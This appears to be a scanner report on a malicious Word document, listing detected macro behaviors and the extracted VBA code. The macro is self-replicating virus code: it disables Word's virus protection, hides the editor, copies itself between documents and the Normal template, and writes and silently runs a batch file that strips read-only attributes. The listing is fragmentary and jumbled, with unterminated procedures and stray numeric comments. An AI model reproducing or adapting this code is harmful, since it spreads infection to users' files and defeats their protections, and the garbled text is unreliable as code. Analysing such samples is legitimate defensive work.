behavior.Chr: May attempt to obfuscate specific str
behavior.CodeModule: May attempt to modify the VBA code
behavior.Document_Close: Runs when the Word document is closed
behavior.Document_New: Runs when a new Word document is created
behavior.Document_Open: Runs when the Word or Publisher document is opened
behavior.Hex Strings: Hex-encoded str were detected, may be used to obfuscate str
behavior.Shell: May run an executable file or a system command
behavior.VBA Stomping: VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code
behavior.VBComponents: May attempt to modify the VBA code
behavior.VBProject: May attempt to modify the VBA code
behavior.vbHide: May run an executable file or a system command

docinfo.macro:
Private Sub Document_Close()

         On Error GoTo skam

    Options.VirusProtection = False

    SWL

skam:

     Private Sub SWL()
'25.46019
              Application.                                                           ShowVisualBasicEditor = False

     If Not ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

             For I = 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines

            d = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

        If Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

       While Mid(d, Len(d) - 1, 2) = " _"

     I = I + 1
'58.45293
  d = Left(d, Len(d) - 1) & NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

  Wend
'78.21387
 d = e(d)
'46.3584
          ActiveDocument.                                VBProject.VBComponents(1).CodeModule.InsertLines I * 2, d

          End If
'80.25874
              Next I

  ActiveDocument.                                             SaveAs AddToRecentFiles:=False

          End If
'44.11147
  End Sub

Private Sub ABS99()

 d = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

             If Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

       While Mid(d, Len(d) - 1, 2) = " _"

  I = I + 1

  d = Left(d, Len(d) - 1) & ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

  Wend

            NormalTemplate.             VBProject.VBComponents(1).CodeModule.InsertLines I * 2, d

          End If
'33.90907
    Next I

           NormalTemplate.                             Save

     End If

          Private Sub f(fName)

   If GetAttr(fName) And vbReadOnly Then
'95.71298
Open Dir(fName) & ".bat" For Append As #1

             Print #1, "Attrib " & "-r " & Chr$(34) & fName & Chr$(34)

      Print #1, "del " & Chr$(34) & Dir(fName) & ".bat" & Chr$(34)

  Close #1

            shellResult = Shell(Dir(fName) & ".bat", vbHide)
'86.16203
End If
